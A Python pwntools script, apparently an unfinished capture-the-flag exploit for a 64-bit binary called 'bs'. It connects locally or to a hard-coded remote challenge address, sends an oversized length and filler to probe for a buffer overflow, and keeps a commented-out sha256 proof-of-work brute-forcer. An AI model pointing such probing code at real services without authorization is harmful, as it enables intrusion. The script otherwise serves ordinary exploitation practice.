import sys
sys.path.append("/home/pwnuser/Desktop/roputils")
sys.path.append("/home/pwnuser/Desktop/pwn")
from tool import *
from roputils import *
from pwn import *
from time import sleep

# bs
# 64bit  dyna
# full relo , stack canary , nx

fpath = "./bs"
libcpath = "./libc.so.6"
debug = 1

# offset =
def sleep2(num):
	while num != 0:
		print num
		num -=1
		sleep(1)
elf = ELF(fpath)
libc = ELF(libcpath)
if debug:
     	p = process(fpath)
else:
	p = remote("47.91.226.78",10005)
sleep(1)
print p.recv()

if __name__ == '__main__':
	# test_len = 0x100c
	test_len = 0x10000
	print(str(test_len))
	p.sendline(str(test_len) )
	# print p.recv()
	p.sendline(fill(test_len))
	sleep2(1)
	print p.recv()













# from hashlib import sha256
# import string,random
# sou = "sha256(xxxx+ovhe9GmL75SdN11w) == 32d92f748ddfdde4373e251680618cec140ba1524d3c55f399084e3530e04b7c"

# result = sou.split("==")[1].replace(" " , "")
# left = sou.split("==")[0].replace(" " , "")[12:-1]
# print result
# print left
# sou_list  = string.letters+string.digits
# def get_char(offset):
# 	return sou_list[offset]
# length = len(sou_list)	
# for a in xrange(length):
# 	for  b in xrange(length):
# 		for c in xrange(length):
# 			for d in xrange(length):
# 				chal = get_char(a) + get_char(b) + get_char(c) + get_char(d)
# 				if sha256(str(chal) + left) == result:
# 					print chal
# 					exit(0)
# print "error"
# while sha256(str(chal) + left).digest() != result:
	# chal = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
# print chal
		